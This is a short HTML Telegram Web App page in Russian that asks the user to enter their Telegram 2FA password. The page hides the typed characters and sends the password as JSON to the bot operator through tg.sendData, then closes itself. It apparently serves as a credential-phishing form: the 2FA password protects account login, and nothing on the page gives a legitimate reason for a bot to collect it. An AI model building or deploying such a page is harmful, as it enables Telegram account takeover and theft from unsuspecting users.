<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

  <title>Введите 2FA</title>

  <script src="https://telegram.org/js/telegram-web-app.js"></script>

  <style>
    body {
      margin: 0;
      padding: 24px;
      background: #111;
      color: white;
      font-family: Arial, sans-serif;
    }

    .box {
      max-width: 420px;
      margin: 40px auto;
    }

    h2 {
      margin-bottom: 18px;
    }

    .input-wrapper {
      position: relative;
      width: 100%;
    }

    input {
      width: 100%;
      padding: 14px;
      font-size: 20px;
      border-radius: 12px;
      border: none;
      outline: none;
      margin-top: 12px;
      box-sizing: border-box;

      background: white;

      color: transparent;
      caret-color: black;

      text-shadow: 0 0 0 transparent;
      -webkit-text-security: none;
    }

    input::placeholder {
      color: #888;
      text-shadow: none;
    }

    button {
      width: 100%;
      padding: 14px;
      margin-top: 18px;
      border: none;
      border-radius: 12px;
      font-size: 17px;
      background: #2ea6ff;
      color: white;
      cursor: pointer;
      font-weight: bold;
    }

    .hint {
      color: #aaa;
      font-size: 14px;
      margin-top: 12px;
      line-height: 1.4;
    }
  </style>
</head>

<body>

  <div class="box">

    <h2>Введите 2FA пароль</h2>

    <div class="input-wrapper">

      <input
        id="password"
        type="password"
        inputmode="text"
        autocomplete="off"
        autocorrect="off"
        autocapitalize="off"
        spellcheck="false"
        placeholder="Пароль 2FA"
      />

    </div>

    <button onclick="sendPassword()">
      Отправить
    </button>

    <div class="hint">
      Пароль не будет виден в чате.
    </div>

  </div>

  <script>

    const tg = window.Telegram.WebApp;

    tg.expand();

    function sendPassword() {

      const password = document
        .getElementById("password")
        .value
        .trim();

      if (!password) {
        alert("Введите пароль");
        return;
      }

      tg.sendData(JSON.stringify({
        type: "2fa_password",
        password: password
      }));

      tg.close();
    }

  </script>

</body>
</html>
